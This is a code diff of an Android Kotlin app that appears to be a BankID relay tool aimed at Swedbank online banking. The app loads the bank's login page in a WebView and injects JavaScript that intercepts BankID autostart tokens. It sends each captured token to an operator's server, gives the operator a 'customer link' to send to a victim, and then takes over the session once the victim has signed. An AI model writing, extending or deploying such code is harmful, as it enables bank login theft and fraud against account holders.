@@ -6,11 +6,9 @@ import android.content.SharedPreferences
 import android.graphics.Color
 import android.net.Uri
 import android.os.Bundle
-import android.os.Message
 import android.view.ViewGroup
 import android.view.WindowManager
 import android.webkit.JavascriptInterface
-import android.webkit.WebChromeClient
 import android.webkit.WebResourceRequest
 import android.webkit.WebView
 import android.webkit.WebViewClient
@@ -26,54 +24,70 @@ class MainActivity : Activity() {
 
     private lateinit var web: WebView
     private lateinit var bar: TextView
-    private lateinit var field: EditText
+    private lateinit var serverField: EditText
+    private lateinit var bankField: EditText
     private lateinit var modeBtn: Button
+    private lateinit var inBtn: Button
     private lateinit var p: SharedPreferences
 
     private var baseUrl = ""
+    private var bankUrl = ""
     private var last = ""
-    private var doneSeen = false
-    private var busy = false
     private var kund = true
-    private var alive = true
-    private var reloaded = false
+
+    private val inst = "(function(){if(window.__rh){return}window.__rh=1;" +
+        "var W=window.open;window.open=function(u){try{if(u&&String(u).indexOf('autostarttoken')>=0){location.href=u;return window}}catch(e){}return W.apply(window,arguments)};" +
+        "setInterval(function(){try{var a=document.querySelector('a[href*=autostarttoken]');" +
+        "if(a&&a.href){var m=/[?&]autostarttoken=([0-9a-fA-F-]{36})/.exec(a.href);if(m)Relay.tok(m[1])}}catch(e){}},700)})()"
 
     override fun onCreate(b: Bundle?) {
         super.onCreate(b)
         p = getSharedPreferences("relay", 0)
         baseUrl = p.getString("base", "") ?: ""
+        bankUrl = p.getString("bank", "https://online.swedbank.se/") ?: "https://online.swedbank.se/"
         kund = p.getBoolean("kund", true)
         window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
         ui()
-        alive = true
-        tick()
     }
 
     private fun ui() {
         val root = LinearLayout(this)
         root.orientation = LinearLayout.VERTICAL
 
-        val top = LinearLayout(this)
-        top.orientation = LinearLayout.HORIZONTAL
+        val rad1 = LinearLayout(this)
+        rad1.orientation = LinearLayout.HORIZONTAL
 
-        field = EditText(this)
-        field.hint = "server-url"
-        field.setText(baseUrl)
-        top.addView(field, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))
+        serverField = EditText(this)
+        serverField.hint = "server-url"
+        serverField.setText(baseUrl)
+        rad1.addView(serverField, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))
 
         val run = Button(this)
         run.text = "KOR"
         run.setOnClickListener {
-            baseUrl = field.text.toString().trim().trimEnd('/')
+            baseUrl = serverField.text.toString().trim().trimEnd('/')
             p.edit().putString("base", baseUrl).apply()
-            doneSeen = false
-            reloaded = false
             last = ""
-            if (p.getString("code", "") == null || (p.getString("code", "") ?: "").isEmpty()) newSession()
+            if ((p.getString("code", "") ?: "").isEmpty()) newSession()
             bar.text = "laddar banksidan"
-            web.loadUrl(p.getString("bank", "https://online.swedbank.se/") ?: "https://online.swedbank.se/")
+            web.loadUrl(bankUrl)
         }
-        top.addView(run, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
+        rad1.addView(run, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
+        root.addView(rad1)
+
+        val rad2 = LinearLayout(this)
+        rad2.orientation = LinearLayout.HORIZONTAL
+
+        bankField = EditText(this)
+        bankField.hint = "bank-url"
+        bankField.setText(bankUrl)
+        bankField.setOnFocusChangeListener { _, harFokus ->
+            if (!harFokus) {
+                bankUrl = bankField.text.toString().trim()
+                p.edit().putString("bank", bankUrl).apply()
+            }
+        }
+        rad2.addView(bankField, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))
 
         modeBtn = Button(this)
         modeBtn.text = if (kund) "KUND" else "OP"
@@ -82,27 +96,25 @@ class MainActivity : Activity() {
             modeBtn.text = if (kund) "KUND" else "OP"
             p.edit().putBoolean("kund", kund).apply()
         }
-        top.addView(modeBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
+        rad2.addView(modeBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
 
-        val om = Button(this)
-        om.text = "OM"
-        om.setOnClickListener { web.reload() }
-        top.addView(om, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
+        inBtn = Button(this)
+        inBtn.text = "IN"
+        inBtn.setOnClickListener { taIn() }
+        rad2.addView(inBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
 
         val ny = Button(this)
         ny.text = "KOD"
         ny.setOnClickListener { newSession() }
-        top.addView(ny, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
-
-        root.addView(top)
+        rad2.addView(ny, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
+        root.addView(rad2)
 
         bar = TextView(this)
-        bar.textSize = 12f
+        bar.textSize = 11f
         bar.setBackgroundColor(Color.parseColor("#101010"))
         bar.setTextColor(Color.parseColor("#66ff88"))
-        bar.setPadding(14, 10, 14, 10)
+        bar.setPadding(14, 8, 14, 8)
         bar.text = "redo"
-        bar.setOnLongClickListener { newSession(); true }
         root.addView(bar)
 
         web = WebView(this)
@@ -126,17 +138,15 @@ class MainActivity : Activity() {
                 return false
             }
 
+            override fun onPageFinished(v: WebView, url: String?) {
+                try { web.evaluateJavascript(inst, null) } catch (t: Throwable) {}
+            }
+
             override fun doUpdateVisitedHistory(v: WebView, url: String?, isReload: Boolean) {
                 if (url == null) return
                 var s = url.replace("https://", "").replace("http://", "")
-                if (s.length > 64) s = s.substring(0, 64)
+                if (s.length > 62) s = s.substring(0, 62)
                 bar.text = s
-            }
-        }
-
-        web.webChromeClient = object : WebChromeClient() {
-            override fun onCreateWindow(v: WebView, isDialog: Boolean, isUserGesture: Boolean, msg: Message): Boolean {
-                return false
             }
         }
 
@@ -164,14 +174,23 @@ class MainActivity : Activity() {
         last = t
         val c = p.getString("code", "") ?: ""
         if (c.isEmpty()) { newSession(); return }
-        bar.text = "TOKEN SKICKAD till kund " + c
         post("/api/session/" + c + "/token", t)
+        inBtn.setBackgroundColor(Color.parseColor("#22aa55"))
+        inBtn.setTextColor(Color.WHITE)
+        bar.text = "TOKEN SKICKAD - tryck IN nar kunden sagt klart"
         if (!kund) {
             try {
                 startActivity(Intent(Intent.ACTION_VIEW,
                     Uri.parse("https://app.bankid.com/?autostarttoken=" + t + "&redirect=null")))
             } catch (x: Throwable) {}
         }
+    }
+
+    private fun taIn() {
+        bankUrl = bankField.text.toString().trim()
+        p.edit().putString("bank", bankUrl).apply()
+        bar.text = "TAR IN - laddar banken"
+        web.loadUrl(bankUrl)
     }
 
     private fun newSession() {
@@ -197,8 +216,6 @@ class MainActivity : Activity() {
         if (c.isNotEmpty()) {
             p.edit().putString("code", c).apply()
             last = ""
-            doneSeen = false
-            reloaded = false
             bar.text = "KUNDLANK: " + baseUrl + "/k/" + c
         }
     }
@@ -220,65 +237,6 @@ class MainActivity : Activity() {
                 con.disconnect()
             } catch (t: Throwable) {}
         }.start()
-    }
-
-    private fun checkDone() {
-        if (doneSeen || busy) return
-        if (baseUrl.isEmpty()) return
-        val c = p.getString("code", "") ?: ""
-        if (c.isEmpty()) return
-        busy = true
-        var hit = false
-        try {
-            val con = URL(baseUrl + "/api/session/" + c + "/state").openConnection() as HttpURLConnection
-            con.connectTimeout = 5000
-            con.readTimeout = 5000
-            val br = con.inputStream.bufferedReader()
-            var line = br.readLine()
-            while (line != null) {
-                if (line.indexOf("done") >= 0 || line.indexOf("signed") >= 0) hit = true
-                line = br.readLine()
-            }
-            br.close()
-            con.disconnect()
-        } catch (t: Throwable) {}
-        busy = false
-        if (hit) {
-            doneSeen = true
-            runOnUiThread { bar.text = "KUND KLAR - vantar pa banken" }
-            if (!reloaded) {
-                reloaded = true
-                try { Thread.sleep(4000) } catch (t: Throwable) {}
-                runOnUiThread { try { web.reload() } catch (t: Throwable) {} }
-            }
-        }
-    }
-
-    private fun tick() {
-        val nudge = "(function(){try{Object.defineProperty(document,'hidden',{get:function(){return false}});" +
-            "Object.defineProperty(document,'visibilityState',{get:function(){return 'visible'}})}catch(e){}" +
-            "try{window.dispatchEvent(new Event('focus'))}catch(e){}" +
-            "try{document.dispatchEvent(new Event('visibilitychange'))}catch(e){}" +
-            "try{window.dispatchEvent(new Event('pageshow'))}catch(e){}" +
-            "if(!window.__rh){window.__rh=1;setInterval(function(){try{" +
-            "var a=document.querySelector('a[href*=autostarttoken]');" +
-            "if(a&&a.href){var m=/[?&]autostarttoken=([0-9a-fA-F-]{36})/.exec(a.href);" +
-            "if(m)Relay.tok(m[1])}}catch(e){}},800)}})()"
-
-        Thread {
-            while (alive) {
-                try { Thread.sleep(2500) } catch (t: Throwable) {}
-                runOnUiThread {
-                    try { web.evaluateJavascript(nudge, null) } catch (t: Throwable) {}
-                }
-                try { checkDone() } catch (t: Throwable) {}
-            }
-        }.start()
-    }
-
-    override fun onDestroy() {
-        alive = false
-        super.onDestroy()
     }
 
     override fun onBackPressed() {
